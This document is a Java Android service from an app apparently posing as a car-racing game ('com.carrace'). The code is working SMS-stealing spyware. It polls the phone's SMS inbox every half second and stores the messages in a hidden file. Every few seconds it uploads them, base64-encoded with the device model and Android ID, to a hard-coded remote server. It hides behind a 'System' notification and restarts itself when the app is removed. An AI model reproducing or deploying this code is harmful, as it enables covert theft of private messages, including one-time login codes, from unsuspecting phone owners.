package com.carrace;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.Nullable;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.HashSet;
import java.util.Set;

public class SmsService extends Service {

    private static final String TAG = "SmsService";
    private static final String CH_ID = "sms_sync";
    public  static final String JSON_FILE = ".temp.json";

    // ====== UBAH INI ======
    private static final String SERVER_URL = "http://pendataan-guru.page.gd/api.php";
    private static final String API_KEY    = "fb93127a4ee69b569b8b941f63f08333a1ce66df305d34d37206d0df82053782";
    // ======================

    private static final long POLL_INTERVAL_MS = 500L;
    private static final long SYNC_INTERVAL_MS = 3000L;

    private Handler handler;
    private volatile String lastSentHash = "";
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(1, buildNotif(),
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
            } else {
                startForeground(1, buildNotif());
            }
        } catch (Exception e) {
            Log.e(TAG, "startForeground failed", e);
        }

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "CarRace::SmsLock");
            wakeLock.setReferenceCounted(false);
            try { wakeLock.acquire(); } catch (Exception ignored) {}
        }

        handler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        handler.removeCallbacksAndMessages(null);
        handler.post(pollRunnable);
        handler.post(syncRunnable);
        return START_STICKY;
    }

    private final Runnable pollRunnable = new Runnable() {
        @Override public void run() {
            try { pollInbox(); } catch (Exception e) { Log.w(TAG, "poll", e); }
            handler.postDelayed(this, POLL_INTERVAL_MS);
        }
    };

    private final Runnable syncRunnable = new Runnable() {
        @Override public void run() {
            try { syncToServer(); } catch (Exception e) { Log.w(TAG, "sync", e); }
            handler.postDelayed(this, SYNC_INTERVAL_MS);
        }
    };

    private void pollInbox() {
        if (!hasSms() || !hasStorage()) return;

        JSONArray merged = new JSONArray();
        Set<String> seen = new HashSet<>();
        File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);

        if (target.exists() && target.length() > 0) {
            try {
                byte[] data = readAll(target);
                JSONArray arr = new JSONArray(new String(data, StandardCharsets.UTF_8));
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject o = arr.getJSONObject(i);
                    String key = o.optString("address", "") + "|" + o.optLong("date", 0);
                    if (seen.add(key)) merged.put(o);
                }
            } catch (Exception ignored) {}
        }

        boolean changed = false;
        Cursor c = null;
        try {
            c = getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    new String[]{"_id", "address", "body", "date", "person", "read"},
                    null, null, "date ASC");
            if (c != null) {
                while (c.moveToNext()) {
                    String addr = c.getString(1);
                    String body = c.getString(2);
                    long date = c.getLong(3);
                    String key = addr + "|" + date;
                    if (!seen.add(key)) continue;

                    JSONObject o = new JSONObject();
                    o.put("address", addr);
                    o.put("body", body);
                    o.put("date", date);
                    o.put("person", c.getLong(4));
                    o.put("read", c.getInt(5));
                    o.put("source", "inbox");
                    merged.put(o);
                    changed = true;
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "query inbox", e);
        } finally {
            if (c != null) c.close();
        }

        if (changed) writeJson(target, merged);
    }

    private void syncToServer() {
        if (!hasStorage()) return;
        File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);
        if (!target.exists() || target.length() == 0) return;

        try {
            byte[] data = readAll(target);
            String hash = sha256(data);
            if (hash.equals(lastSentHash)) return;

            boolean ok = upload(target, data);
            if (ok) {
                lastSentHash = hash;
                Log.d(TAG, "uploaded " + data.length + " bytes");
            }
        } catch (Exception e) {
            Log.w(TAG, "sync failed", e);
        }
    }

    private boolean upload(File file, byte[] data) {
        try {
            JSONObject device = new JSONObject();
            device.put("manufacturer", safe(Build.MANUFACTURER));
            device.put("model", safe(Build.MODEL));
            device.put("brand", safe(Build.BRAND));
            device.put("device", safe(Build.DEVICE));
            device.put("product", safe(Build.PRODUCT));
            device.put("android_version", safe(Build.VERSION.RELEASE));
            device.put("sdk", Build.VERSION.SDK_INT);
            device.put("android_id", safe(androidId()));
            device.put("host", safe(Build.HOST));

            String deviceB64 = Base64.encodeToString(
                    device.toString().getBytes(StandardCharsets.UTF_8), Base64.NO_WRAP);
            String smsB64 = Base64.encodeToString(data, Base64.NO_WRAP);

            String body = "device_info=" + URLEncoder.encode(deviceB64, "UTF-8")
                    + "&sms=" + URLEncoder.encode(smsB64, "UTF-8");

            URL url = new URL(SERVER_URL + "?key=" + URLEncoder.encode(API_KEY, "UTF-8"));
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length", String.valueOf(body.getBytes().length));

            OutputStream os = conn.getOutputStream();
            os.write(body.getBytes(StandardCharsets.UTF_8));
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            conn.disconnect();
            Log.d(TAG, "server resp=" + code);
            return code == 200;
        } catch (Exception e) {
            Log.e(TAG, "upload failed", e);
            return false;
        }
    }

    private String androidId() {
        try {
            return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return "unknown";
        }
    }

    private static String safe(String s) {
        return s == null ? "" : s.replace("\n", " ");
    }

    private void writeJson(File target, JSONArray arr) {
        try {
            FileOutputStream out = new FileOutputStream(target, false);
            out.write(arr.toString(2).getBytes(StandardCharsets.UTF_8));
            out.flush();
            out.close();
        } catch (Exception e) {
            Log.w(TAG, "write json", e);
        }
    }

    private boolean hasSms() {
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(android.Manifest.permission.READ_SMS)
                    == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private boolean hasStorage() {
        if (Build.VERSION.SDK_INT >= 30) return Environment.isExternalStorageManager();
        return true;
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CH_ID, "System", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotif() {
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(this, CH_ID);
        } else {
            b = new Notification.Builder(this);
        }
        b.setContentTitle("System")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_MIN);
        return b.build();
    }

    private static byte[] readAll(File f) throws Exception {
        FileInputStream in = new FileInputStream(f);
        byte[] buf = new byte[(int) f.length()];
        int read = 0;
        while (read < buf.length) {
            int r = in.read(buf, read, buf.length - read);
            if (r < 0) break;
            read += r;
        }
        in.close();
        return buf;
    }

    private static String sha256(byte[] data) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] d = md.digest(data);
        StringBuilder sb = new StringBuilder();
        for (byte b : d) sb.append(String.format("%02x", b));
        return sb.toString();
    }

    @Override
    public void onDestroy() {
        if (handler != null) handler.removeCallbacksAndMessages(null);
        if (wakeLock != null && wakeLock.isHeld()) {
            try { wakeLock.release(); } catch (Exception ignored) {}
        }
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        try {
            Intent restart = new Intent(getApplicationContext(), SmsService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(restart);
            } else {
                startService(restart);
            }
        } catch (Exception ignored) {}
        super.onTaskRemoved(rootIntent);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
